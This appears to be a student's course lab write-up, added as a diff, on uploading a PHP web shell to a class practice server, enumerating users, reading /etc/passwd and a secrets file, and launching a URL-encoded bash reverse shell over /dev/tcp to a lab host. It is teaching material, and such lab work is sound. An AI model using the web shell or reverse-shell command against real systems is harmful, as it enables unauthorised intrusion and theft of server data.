@@ -1,0 +1,48 @@
+Our First Reverse Shell
+Author: Ryan Son
+Date: 10/30/2024
+
+Part 1: Installing a PHP Web Shell
+a. After uploading the PHP webshell script that was provided in the assignment, I followed the target path
+	that was provided after uploading the script: uploadedimages/sonr-webshell.php and input this path
+	at the end of http://danger.jeffondich.com/ so the full link becomes: 
+	http://danger.jeffondich.com/uploadedimages/sonr-webshell.php?command=whoami and the final result
+	that was outputted was www-data
+b. <pre> tag is used to format the output data with new line inputs, otherwise the browser will intepret
+	the output as HTML if the <pre> tag is left out.
+
+Part 2: Looking Around
+a. /var/www/
+b. root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody 
+	systemd-network systemd-resolve messagebus systemd-timesync syslog _apt tss uuidd tcpdump usbmux sshd 
+	pollinate landscape fwupd-refresh jeff postgres bullwinkle, these were found using getent passwd which 
+	contains all of the users that the server contains.
+c. After typing in "cat /etc/*passwd" I was able to access the contents of passwd. /etc/passwd contains the 
+	users' public information such as their login name and home directories.
+d. No, every time I try to cat the file, it resets the connection. /etc/shadow contains the hashed password
+	for the users' logins. 
+e. Found the kindasecret.txt file
+	cat /var/www/danger.jeffondich.com/secrets/kindasecret.txt
+
+Part 3: Setup for Part 4
+ 
+Part 4: Launching a Reverse Shell
+a. 192.168.64.2, ifconfig on Kali
+b. 192.168.64.1 and 127.0.0.1, ifconfig on MacOS, use 192.168.64.2 because they share the same subnet mask so
+	they are on the same network.
+c. 5001
+d. http://192.168.68.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.68.1/5001%200%3E%261%22
+e. I have a shell now and can execute commands such as ls and cat /etc/passwd
+f. Percent allows for the insertion of special characters into the bash that allows for it to redirect the bash
+	output to my terminal.
+g. Firstly the apache server needs to started on Kali. Then a php file called webshell is added to the apache server. 
+	This requires read privledges to allow apache to read the php file in /var/www/html on Kali. After which the IP 
+	addresses for both of the host OS and the apache server are required to begin a cross connection between the two. 
+	By entering this url: http://192.168.68.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.68.1/5001%200%3E%261%22 
+	it will establish that connection on port 5001, where the server will connect to the host OS that is listening on the port. 
+	This will then allow the host OS (the attacker) to input bash commands and then the server will reply with the output of the bash as if it were a terminal. 
+
+
+
+
+
